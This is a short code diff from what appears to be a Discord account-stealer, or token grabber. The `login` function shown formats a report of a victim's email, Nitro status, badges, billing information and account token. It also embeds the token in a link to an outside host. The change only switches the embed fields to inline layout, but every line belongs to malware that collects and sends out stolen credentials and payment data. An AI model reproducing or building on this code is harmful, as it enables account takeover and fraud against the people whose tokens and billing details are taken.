@@ -622,17 +622,17 @@ const login = async (email, password, token) => {
           {
             name: '<a:satanist:802503618972483615> nitro:',
             value: `\`${nitro}\``,
-            inline: false,
+            inline: true,
           },
           {
             name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
-            inline: false,
+            inline: true,
           },    
           {
             name: '<:944007233820307467:959785232037470208> Billing:',
             value: `**${billing}**`,
-            inline: false,
+            inline: true,
           },
           {
             name: '<:944007233820307467:959785232037470208> Email:',
@@ -657,7 +657,7 @@ const login = async (email, password, token) => {
           {
             name: '<a:944007295417843743:959785231982931979> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
-            inline: false,
+            inline: true,
           },
 
         ],
